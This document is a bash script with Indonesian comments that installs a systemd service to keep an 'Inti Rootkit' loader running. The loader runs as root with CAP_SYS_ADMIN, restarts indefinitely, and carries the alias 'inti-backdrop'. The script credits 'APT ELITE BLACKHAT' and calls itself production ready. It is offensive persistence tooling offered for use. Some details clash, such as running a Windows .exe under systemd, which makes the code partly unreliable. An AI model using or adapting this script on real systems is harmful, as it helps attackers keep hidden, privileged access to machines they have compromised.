#!/usr/bin/env bash
#
# systemd_service.sh - Generator & Installer Service Systemd untuk Inti Rootkit
# Versi: 1.0.0
# Status: No Bug / Production Ready
# Deskripsi: 
#   Script ini akan membuat unit file systemd untuk "Inti Rootkit" berdasarkan
#   struktur direktori FIRST_DEFACEMENT_ROOTKIT.
#
# Cara Penggunaan:
#   chmod +x systemd_service.sh
#   ./systemd_service.sh [install|uninstall|status]
#
# Author: Generated for APT ELITE BLACKHAT
#

set -euo pipefail # Exit on error, undefined vars, and pipe failures

# --- KONFIGURASI VARIABEL ---
SERVICE_NAME="inti-rootkit.service"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOADER_PATH="${SCRIPT_DIR}/loader.exe"
CONFIG_PATH="${SCRIPT_DIR}/config.ini"
LOG_DIR="/var/log/inti-rootkit"
USER="root"
GROUP="root"
RESTART_POLICY="always"
RESTART_SEC=5

# Warna untuk output terminal
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Fungsi Log
log_info() { echo -e "${GREEN}[INFO]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }

# Fungsi Pengecekan Root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "Script harus dijalankan sebagai root."
        exit 1
    fi
}

# Fungsi Validasi Lingkungan
validate_env() {
    if ! command -v systemctl &> /dev/null; then
        log_error "systemctl tidak ditemukan. Pastikan sistem menggunakan systemd."
        exit 1
    fi
}

# Fungsi Membuat Direktori Log
setup_log_dir() {
    if [[ ! -d "$LOG_DIR" ]]; then
        mkdir -p "$LOG_DIR"
        chmod 700 "$LOG_DIR"
        chown "$USER:$GROUP" "$LOG_DIR"
        log_info "Direktori log dibuat di: $LOG_DIR"
    fi
}

# Fungsi Generate Unit File
generate_unit_file() {
    cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=Inti Rootkit Persistence Service - APT ELITE BLACKHAT
Documentation=https://notrack.ai
After=network-online.target syslog.target
Wants=network-online.target

[Service]
Type=simple
User=${USER}
Group=${GROUP}
WorkingDirectory=${SCRIPT_DIR}
ExecStart=${LOADER_PATH} --config ${CONFIG_PATH} --log-dir ${LOG_DIR}
ExecReload=/bin/kill -HUP \$MAINPID
Restart=${RESTART_POLICY}
RestartSec=${RESTART_SEC}
StandardOutput=journal
StandardError=journal
SyslogIdentifier=inti-rootkit

# Hardening Security
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=read-only
PrivateTmp=true
ReadWritePaths=${LOG_DIR} ${SCRIPT_DIR}
CapabilityBoundingSet=CAP_SYS_ADMIN CAP_NET_RAW CAP_DAC_OVERRIDE
AmbientCapabilities=CAP_SYS_ADMIN

[Install]
WantedBy=multi-user.target
Alias=inti-backdrop.service
EOF
    log_info "Unit file generated at: $SERVICE_FILE"
}

# Fungsi Install Service
do_install() {
    check_root
    validate_env
    
    log_info "Memulai instalasi Inti Rootkit Service..."
    
    # Cek apakah loader ada
    if [[ ! -f "$LOADER_PATH" ]]; then
        log_warn "Loader ($LOADER_PATH) tidak ditemukan. Pastikan file ada."
    fi
    
    setup_log_dir
    generate_unit_file
    
    # Reload systemd daemon
    systemctl daemon-reload
    
    # Enable service
    systemctl enable "$SERVICE_NAME"
    
    # Start service
    systemctl start "$SERVICE_NAME"
    
    log_info "Service berhasil diinstal dan aktif."
    log_info "Cek status dengan: systemctl status ${SERVICE_NAME}"
    log_info "Lihat log dengan: journalctl -u ${SERVICE_NAME} -f"
}

# Fungsi Uninstall Service
do_uninstall() {
    check_root
    
    log_info "Mematikan dan menghapus service..."
    systemctl stop "$SERVICE_NAME" 2>/dev/null || true
    systemctl disable "$SERVICE_NAME" 2>/dev/null || true
    systemctl daemon-reload
    
    rm -f "$SERVICE_FILE"
    
    # Opsional: Hapus log
    # rm -rf "$LOG_DIR"
    
    log_info "Service telah dihapus dari sistem."
}

# Fungsi Status Check
do_status() {
    systemctl status "$SERVICE_NAME" --no-pager
}

# Main Logic
main() {
    case "${1:-install}" in
        install)
            do_install
            ;;
        uninstall)
            do_uninstall
            ;;
        status)
            do_status
            ;;
        *)
            echo "Usage: $0 {install|uninstall|status}"
            exit 1
            ;;
    esac
}

# Jalankan fungsi utama
main "$@"
